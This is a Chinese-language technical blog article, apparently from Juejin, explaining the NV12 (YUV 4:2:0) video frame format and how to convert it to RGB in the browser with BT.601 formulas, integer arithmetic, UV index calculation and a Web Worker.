                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>由于浏览器无法直接显示 NV12 格式，需要转换为 RGB 才能在 Canvas 或 Image 中显示。</p>
<h2 data-id="heading-1">基础概念</h2>
<h3 data-id="heading-2">什么是 YUV？</h3>
<p>YUV 是一种颜色编码系统，与 RGB 不同：</p>
<ul>
<li><strong>Y（亮度）</strong> ：表示图像的明暗程度，人眼对亮度最敏感</li>
<li><strong>U（色度）</strong> ：表示蓝色与亮度的差值</li>
<li><strong>V（色度）</strong> ：表示红色与亮度的差值</li>
</ul>
<h3 data-id="heading-3">什么是 NV12？</h3>
<p>NV12 是 YUV 格式的一种，采用 <strong>4:2:0 采样</strong>：</p>
<ul>
<li><strong>4:2:0</strong> 表示：每 4 个 Y 像素共享 1 个 UV 像素对</li>
<li><strong>存储方式</strong>：Y 平面完整存储，UV 平面交错存储（U、V、U、V...）</li>
<li><strong>数据大小</strong>：<code>width × height × 1.5</code> 字节</li>
</ul>
<h3 data-id="heading-4">RGB vs YUV vs NV12</h3>





























<table><thead><tr><th>格式</th><th>数据大小</th><th>用途</th><th>浏览器支持</th></tr></thead><tbody><tr><td>RGB</td><td><code>width × height × 3</code></td><td>显示、编辑</td><td>✅ 原生支持</td></tr><tr><td>YUV</td><td>多种变体</td><td>视频编码</td><td>❌ 需要转换</td></tr><tr><td>NV12</td><td><code>width × height × 1.5</code></td><td>视频处理</td><td>❌ 需要转换</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">NV12 格式详解</h2>
<h3 data-id="heading-6">数据布局</h3>
<p>NV12 数据由两部分组成：</p>
<pre><code class="hljs language-arduino" lang="arduino">┌─────────────────────────────────┐
│  Y 平面（亮度）                  │
│  大小：width × height 字节       │
│  每个像素 <span class="hljs-number">1</span> 字节                 │
├─────────────────────────────────┤
│  UV 平面（色度，交错存储）       │
│  大小：width × height / <span class="hljs-number">2</span> 字节   │
│  格式：U V U V U V ...          │
└─────────────────────────────────┘
​
总大小 = width × height × <span class="hljs-number">1.5</span> 字节
</code></pre>
<h3 data-id="heading-7">示例：1920×1080 图像</h3>
<pre><code class="hljs language-ini" lang="ini">Y 平面：1920 × <span class="hljs-attr">1080</span> = <span class="hljs-number">2</span>,<span class="hljs-number">073</span>,<span class="hljs-number">600</span> 字节
UV 平面：1920 × 1080 / <span class="hljs-attr">2</span> = <span class="hljs-number">1</span>,<span class="hljs-number">036</span>,<span class="hljs-number">800</span> 字节
总大小：3,110,400 字节
​
数据排列：
<span class="hljs-section">[Y Y Y Y ... Y]</span> <span class="hljs-section">[U V U V U V ... U V]</span>
 ↑ 2,073,600 字节  ↑ 1,036,800 字节
</code></pre>
<h3 data-id="heading-8">4:2:0 采样说明</h3>
<pre><code class="hljs language-csharp" lang="csharp">像素布局（<span class="hljs-number">2</span>×<span class="hljs-number">2</span> 像素块）：
┌─────┬─────┐
│ Y₁  │ Y₂  │  ← <span class="hljs-number">4</span> 个 Y 值
├─────┼─────┤
│ Y₃  │ Y₄  │
└─────┴─────┘
     ↓
  共享 <span class="hljs-number">1</span> 个 UV 对
     ↓
   [<span class="hljs-meta">U, V</span>]
</code></pre>
<p><strong>为什么这样设计？</strong></p>
<ul>
<li>人眼对亮度（Y）更敏感，对色度（UV）不敏感</li>
<li>减少色度数据可以节省 50% 存储空间</li>
<li>视频编码标准（H.264/H.265）基于此原理</li>
</ul>
<hr/>
<h2 data-id="heading-9">使用场景</h2>
<h3 data-id="heading-10">1. 视频编码/解码</h3>
<p>视频编解码器（H.264、H.265/HEVC、VP8、VP9）的中间格式：</p>
<pre><code class="hljs">视频文件 → 解码器 → NV12 格式帧 → 转换为 RGB → 显示
</code></pre>
<h3 data-id="heading-11">2. 摄像头/视频流</h3>
<p>摄像头采集的原始数据通常是 YUV（NV12 是其中一种）：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// WebRTC 示例</span>
<span class="hljs-keyword">const</span> stream = <span class="hljs-keyword">await</span> navigator.mediaDevices.getUserMedia({ video: <span class="hljs-literal">true</span> })
<span class="hljs-keyword">const</span> videoTrack = stream.getVideoTracks()[<span class="hljs-number">0</span>]
<span class="hljs-keyword">const</span> imageCapture = <span class="hljs-keyword">new</span> ImageCapture(videoTrack)
<span class="hljs-comment">// 某些 API 可能返回 NV12 格式的原始数据</span>
</code></pre>
<h3 data-id="heading-12">3. WebRTC 视频处理</h3>
<ul>
<li>WebRTC 的 <code>VideoFrame</code> API 可能提供 NV12 格式</li>
<li>视频会议、直播等场景中的原始帧数据</li>
</ul>
<h3 data-id="heading-13">4. 移动端开发</h3>
<ul>
<li><strong>Android</strong>：Camera2 API 输出的格式之一（<code>ImageFormat.YUV_420_888</code>）</li>
<li><strong>iOS</strong>：VideoToolbox 可能输出 NV12</li>
<li>移动端视频处理库的常见输出格式</li>
</ul>
<h3 data-id="heading-14">5. FFmpeg/视频处理库</h3>
<pre><code class="hljs language-css" lang="css"># FFmpeg 处理视频时经常使用 NV12
ffmpeg -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-class">.mp4</span> -pix_fmt nv12 output<span class="hljs-selector-class">.nv12</span>
</code></pre>
<h3 data-id="heading-15">6. 硬件加速</h3>
<ul>
<li>GPU 视频解码器（NVIDIA NVENC、Intel Quick Sync）的输出</li>
<li>硬件编码器通常使用 NV12 作为输入/输出格式</li>
</ul>
<hr/>
<h2 data-id="heading-16">为什么选择 NV12</h2>
<h3 data-id="heading-17">1. 存储效率</h3>
<p><strong>对比：</strong></p>
<pre><code class="hljs language-ini" lang="ini">1920 × 1080 图像：
​
RGB：1920 × 1080 × <span class="hljs-attr">3</span> = <span class="hljs-number">6</span>,<span class="hljs-number">220</span>,<span class="hljs-number">800</span> 字节
NV12：1920 × 1080 × <span class="hljs-attr">1.5</span> = <span class="hljs-number">3</span>,<span class="hljs-number">110</span>,<span class="hljs-number">400</span> 字节
​
节省：50% 存储空间
</code></pre>
<h3 data-id="heading-18">2. 硬件支持</h3>
<ul>
<li>大多数硬件编码器原生支持 NV12</li>
<li>转换成本低，性能好</li>
</ul>
<h3 data-id="heading-19">3. 视频编码标准</h3>
<ul>
<li>主流视频编码标准（H.264、H.265）基于 YUV</li>
<li>NV12 是常见的 YUV 格式，兼容性好</li>
</ul>
<h3 data-id="heading-20">4. 人眼特性</h3>
<ul>
<li>人眼对亮度（Y）敏感，对色度（UV）不敏感</li>
<li>4:2:0 采样符合人眼特性，在视觉质量损失很小的情况下大幅减少数据量</li>
</ul>
<hr/>
<h2 data-id="heading-21">转换原理</h2>
<h3 data-id="heading-22">YUV → RGB 转换公式</h3>
<p>我们使用 <strong>ITU-R BT.601</strong> 标准的转换公式：</p>
<pre><code class="hljs language-ini" lang="ini">// 标准公式（浮点）
<span class="hljs-attr">R</span> = Y + <span class="hljs-number">1.402</span> × (V - <span class="hljs-number">128</span>)
<span class="hljs-attr">G</span> = Y - <span class="hljs-number">0.344</span> × (U - <span class="hljs-number">128</span>) - <span class="hljs-number">0.714</span> × (V - <span class="hljs-number">128</span>)
<span class="hljs-attr">B</span> = Y + <span class="hljs-number">1.772</span> × (U - <span class="hljs-number">128</span>)
​
// 优化后的整数运算（代码中使用）
let <span class="hljs-attr">r</span> = y + ((<span class="hljs-number">359</span> * v + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>)      // <span class="hljs-number">1.402</span> ≈ <span class="hljs-number">359</span>/<span class="hljs-number">256</span>
let <span class="hljs-attr">g</span> = y - ((<span class="hljs-number">88</span> * u + <span class="hljs-number">183</span> * v + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>)  // <span class="hljs-number">0.344</span>≈<span class="hljs-number">88</span>/<span class="hljs-number">256</span>, <span class="hljs-number">0.714</span>≈<span class="hljs-number">183</span>/<span class="hljs-number">256</span>
let <span class="hljs-attr">b</span> = y + ((<span class="hljs-number">454</span> * u + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>)      // <span class="hljs-number">1.772</span> ≈ <span class="hljs-number">454</span>/<span class="hljs-number">256</span>
​
// 限制值在 0-255 范围内
<span class="hljs-attr">r</span> = r &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : r &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : r
<span class="hljs-attr">g</span> = g &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : g &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : g
<span class="hljs-attr">b</span> = b &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : b &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : b
</code></pre>
<p><strong>为什么使用整数运算？</strong></p>
<ul>
<li><code>&gt;&gt; 8</code> 相当于除以 256，比浮点运算快</li>
<li>避免浮点数精度问题</li>
<li>性能更好</li>
</ul>
<h3 data-id="heading-23">转换流程</h3>
<pre><code class="hljs language-arduino" lang="arduino">┌─────────────────┐
│  NV12 原始数据  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  提取 Y 平面    │  ← width × height 字节
│  （亮度信息）    │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  提取 UV 平面   │  ← width × height / <span class="hljs-number">2</span> 字节
│  （色度，交错）  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  对每个像素：    │
│  <span class="hljs-number">1.</span> 计算 UV 索引│  ← <span class="hljs-number">4</span>:<span class="hljs-number">2</span>:<span class="hljs-number">0</span> 采样映射
│  <span class="hljs-number">2.</span> 应用转换公式│  ← YUV → RGB
│  <span class="hljs-number">3.</span> 限制值范围  │  ← <span class="hljs-number">0</span><span class="hljs-number">-255</span> clamp
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  生成 RGBA 数据 │  ← width × height × <span class="hljs-number">4</span> 字节
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  绘制到 Canvas  │
└─────────────────┘
</code></pre>
<h3 data-id="heading-24">UV 索引计算详解</h3>
<p>这是转换中最关键的部分：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 对于像素位置 (x, y)，计算其在数组中的索引</span>
<span class="hljs-type">const</span> i = y * width + x
​
<span class="hljs-comment">// 计算对应的 UV 行（4:2:0 采样，UV 行是 Y 行的一半）</span>
<span class="hljs-type">const</span> uvRow = (i / width | <span class="hljs-number">0</span>) &gt;&gt; <span class="hljs-number">1</span>  <span class="hljs-comment">// 等价于 Math.floor(y / 2)</span>
​
<span class="hljs-comment">// 计算对应的 UV 列（必须是偶数）</span>
<span class="hljs-type">const</span> uvCol = (i % width) &amp; ~<span class="hljs-number">1</span>       <span class="hljs-comment">// 等价于 Math.floor(x / 2) * 2</span>
​
<span class="hljs-comment">// 计算 UV 在数组中的索引</span>
<span class="hljs-type">const</span> uvIndex = uvRow * width + uvCol
​
<span class="hljs-comment">// 获取 U 和 V 值</span>
<span class="hljs-type">const</span> u = uv[uvIndex] - <span class="hljs-number">128</span>      <span class="hljs-comment">// U 值（偏移 128）</span>
<span class="hljs-type">const</span> v = uv[uvIndex + <span class="hljs-number">1</span>] - <span class="hljs-number">128</span>  <span class="hljs-comment">// V 值（偏移 128）</span>
</code></pre>
<p><strong>示例：像素 (100, 50) 在 1920×1080 图像中</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">i</span> = <span class="hljs-number">50</span> * <span class="hljs-number">1920</span> + <span class="hljs-number">100</span> = <span class="hljs-number">96</span>,<span class="hljs-number">100</span>
<span class="hljs-attr">uvRow</span> = (<span class="hljs-number">96</span>,<span class="hljs-number">100</span> / <span class="hljs-number">1920</span>) &gt;&gt; <span class="hljs-number">1</span> = <span class="hljs-number">25</span>
<span class="hljs-attr">uvCol</span> = (<span class="hljs-number">96</span>,<span class="hljs-number">100</span> % <span class="hljs-number">1920</span>) &amp; ~<span class="hljs-number">1</span> = <span class="hljs-number">100</span>
<span class="hljs-attr">uvIndex</span> = <span class="hljs-number">25</span> * <span class="hljs-number">1920</span> + <span class="hljs-number">100</span> = <span class="hljs-number">48</span>,<span class="hljs-number">100</span>
​
// 读取 UV 值
<span class="hljs-attr">u</span> = uv[<span class="hljs-number">48</span>,<span class="hljs-number">100</span>] - <span class="hljs-number">128</span>
<span class="hljs-attr">v</span> = uv[<span class="hljs-number">48</span>,<span class="hljs-number">101</span>] - <span class="hljs-number">128</span>
</code></pre>
<hr/>
<h2 data-id="heading-25">实现细节</h2>
<h3 data-id="heading-26">为什么使用 Web Worker？</h3>
<p>转换是 <strong>CPU 密集型操作</strong>：</p>
<pre><code class="hljs language-diff" lang="diff">1920 × 1080 图像 = 2,073,600 像素
​
每个像素需要：
<span class="hljs-deletion">- 1 次 Y 值读取</span>
<span class="hljs-deletion">- 1 次 UV 索引计算</span>
<span class="hljs-deletion">- 1 次 UV 值读取</span>
<span class="hljs-deletion">- 3 次乘法运算</span>
<span class="hljs-deletion">- 3 次加法运算</span>
<span class="hljs-deletion">- 3 次 clamp 操作</span>
​
总计：约 2,000 万次运算
</code></pre>
<p><strong>在主线程执行的问题：</strong></p>
<ul>
<li>❌ 阻塞 UI，页面卡顿</li>
<li>❌ 用户体验差</li>
<li>❌ 无法利用多核 CPU</li>
</ul>
<p><strong>使用 Web Worker 的优势：</strong></p>
<ul>
<li>✅ 后台处理，不阻塞 UI</li>
<li>✅ 利用多核 CPU</li>
<li>✅ 更好的用户体验</li>
</ul>
<h3 data-id="heading-27">为什么需要提前知道图片的宽高？</h3>
<h4 data-id="heading-28">1. 没有文件头/元数据</h4>
<p>NV12 文件是纯像素数据，不像常见图片格式包含元数据：</p>
<pre><code class="hljs">PNG/JPEG 文件结构：
┌─────────────┐
│  文件头     │ ← 包含宽高、格式等信息
├─────────────┤
│  元数据     │ ← 颜色空间、压缩参数等
├─────────────┤
│  像素数据   │
└─────────────┘
​
NV12 文件结构：
┌─────────────┐
│  像素数据   │ ← 只有原始字节，没有任何元数据！
└─────────────┘
</code></pre>
<h4 data-id="heading-29">2. 需要宽高来计算数据布局</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// nv12Worker.ts</span>
<span class="hljs-type">const</span> { nv12, width, height } = e.data
<span class="hljs-type">const</span> yLen = width * height
<span class="hljs-type">const</span> uv = nv12.<span class="hljs-built_in">subarray</span>(yLen)  <span class="hljs-comment">// 需要知道 yLen 才能分割数据</span>
</code></pre>
<h4 data-id="heading-30">3. 需要宽高来验证文件大小</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> expectedSize = width * height * <span class="hljs-number">1.5</span>
<span class="hljs-keyword">if</span> (file.size !== expectedSize) {
  message.<span class="hljs-built_in">error</span>(
    `文件大小不匹配！期望: ${expectedSize} 字节，实际: ${file.size} 字节`
  )
  <span class="hljs-keyword">return</span>
}
</code></pre>
<h4 data-id="heading-31">4. 需要宽高来正确解析 UV 数据</h4>
<p>UV 数据的索引计算完全依赖宽高：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> uvRow = (i / width | <span class="hljs-number">0</span>) &gt;&gt; <span class="hljs-number">1</span>  <span class="hljs-comment">// 需要 width</span>
<span class="hljs-type">const</span> uvCol = (i % width) &amp; ~<span class="hljs-number">1</span>       <span class="hljs-comment">// 需要 width</span>
<span class="hljs-type">const</span> uvIndex = uvRow * width + uvCol  <span class="hljs-comment">// 需要 width</span>
</code></pre>
<p><strong>如果宽高错误会怎样？</strong></p>






























<table><thead><tr><th>错误类型</th><th>后果</th><th>严重程度</th></tr></thead><tbody><tr><td>文件大小不匹配</td><td>验证失败，无法处理</td><td>⭐⭐⭐</td></tr><tr><td>Y/UV 分割错误</td><td>读取错误的数据段</td><td>⭐⭐⭐⭐⭐</td></tr><tr><td>UV 索引错误</td><td>颜色完全错乱</td><td>⭐⭐⭐⭐⭐</td></tr><tr><td>数组越界</td><td>程序崩溃</td><td>⭐⭐⭐⭐⭐</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-32">常见问题</h2>
<h3 data-id="heading-33">Q1: 如何获取 NV12 文件的宽高？</h3>
<p><strong>方法 1：从视频元数据获取</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> videoTrack = stream.<span class="hljs-built_in">getVideoTracks</span>()[<span class="hljs-number">0</span>]
<span class="hljs-type">const</span> settings = videoTrack.<span class="hljs-built_in">getSettings</span>()
<span class="hljs-type">const</span> width = settings.width   <span class="hljs-comment">// 1920</span>
<span class="hljs-type">const</span> height = settings.height <span class="hljs-comment">// 1080</span>
</code></pre>
<p><strong>方法 2：从文件名解析</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 例如：frame_1920x1080.nv12</span>
const match = filename<span class="hljs-selector-class">.match</span>(/(\d+)<span class="hljs-built_in">x</span>(\d+)/)
const <span class="hljs-attribute">width</span> = <span class="hljs-built_in">parseInt</span>(match[<span class="hljs-number">1</span>])
const <span class="hljs-attribute">height</span> = <span class="hljs-built_in">parseInt</span>(match[<span class="hljs-number">2</span>])
</code></pre>
<p><strong>方法 3：从配置文件/API</strong></p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> response = await <span class="hljs-built_in">fetch</span>(<span class="hljs-string">'/api/video-frame'</span>)
<span class="hljs-type">const</span> { width, height, data } = await response.<span class="hljs-built_in">json</span>()
<span class="hljs-comment">// data 是 NV12 格式的二进制数据</span>
</code></pre>
<h3 data-id="heading-34">Q2: 如果宽高设置错误会怎样？</h3>
<ul>
<li><strong>文件大小验证失败</strong>：程序拒绝处理</li>
<li><strong>数据分割错误</strong>：Y 和 UV 数据读取位置错误</li>
<li><strong>UV 索引错误</strong>：所有颜色错位，图像完全错乱</li>
<li><strong>数组越界</strong>：可能导致程序崩溃</li>
</ul>
<h3 data-id="heading-35">Q3: 为什么 UV 数据要偏移 128？</h3>
<p>YUV 格式中，U 和 V 的值范围是 0-255，但实际表示的是 -128 到 +127：</p>
<ul>
<li>0 表示 -128（最蓝/最绿）</li>
<li>128 表示 0（中性）</li>
<li>255 表示 +127（最红/最黄）</li>
</ul>
<p>所以在转换时需要减去 128 来恢复真实值。</p>
<h3 data-id="heading-36">Q4: 可以处理其他 YUV 格式吗？</h3>
<p>NV12 是 YUV 4:2:0 的一种。其他常见格式：</p>
<ul>
<li><strong>NV21</strong>：UV 顺序相反（V、U、V、U...）</li>
<li><strong>I420</strong>：Y、U、V 分别存储</li>
<li><strong>YV12</strong>：Y、V、U 分别存储</li>
</ul>
<p>需要修改代码来适配不同的格式。</p>
<h3 data-id="heading-37">Q5: 性能如何？</h3>
<p><strong>测试结果（1920×1080 图像）：</strong></p>
<ul>
<li>转换时间：约 20-50ms（取决于 CPU）</li>
<li>内存占用：约 12MB（输入 3MB + 输出 8MB）</li>
<li>帧率：可以处理 20-50 FPS</li>
</ul>
<hr/>
<h2 data-id="heading-38">性能优化</h2>
<h3 data-id="heading-39">1. 使用 Web Worker</h3>
<p>将 CPU 密集型操作移到后台线程，避免阻塞 UI。</p>
<h3 data-id="heading-40">2. 整数运算优化</h3>
<p>使用位运算代替浮点运算：</p>
<pre><code class="hljs language-ini" lang="ini">// 慢
<span class="hljs-attr">r</span> = y + <span class="hljs-number">1.402</span> * (v - <span class="hljs-number">128</span>)
​
// 快
<span class="hljs-attr">r</span> = y + ((<span class="hljs-number">359</span> * v + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>)
</code></pre>
<h3 data-id="heading-41">3. 手动 Clamp</h3>
<p>避免使用 <code>Math.min/max</code>：</p>
<pre><code class="hljs language-ini" lang="ini">// 慢
<span class="hljs-attr">r</span> = Math.max(<span class="hljs-number">0</span>, Math.min(<span class="hljs-number">255</span>, r))
​
// 快
<span class="hljs-attr">r</span> = r &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : r &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : r
</code></pre>
<h3 data-id="heading-42">4. 减少函数调用</h3>
<p>在循环中内联代码，减少函数调用开销。</p>
<h3 data-id="heading-43">5. 使用 Transferable Objects</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 传递 ArrayBuffer，避免复制</span>
worker.<span class="hljs-built_in">postMessage</span>({ nv12, width, height }, [nv12.buffer])
</code></pre>
<hr/>
<h2 data-id="heading-44">总结</h2>
<p>NV12 转 RGB 的核心要点：</p>
<ol start="0">
<li><strong>NV12 是 YUV 4:2:0 格式</strong>，数据大小是 RGB 的一半</li>
<li><strong>需要提前知道宽高</strong>，因为文件没有元数据</li>
<li><strong>使用 Web Worker</strong> 进行后台转换，避免阻塞 UI</li>
<li><strong>UV 索引计算是关键</strong>，需要正确映射 4:2:0 采样</li>
<li><strong>整数运算优化</strong>可以提升性能</li>
</ol>
<p>这个转换在视频处理、图像处理、调试等场景中非常有用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>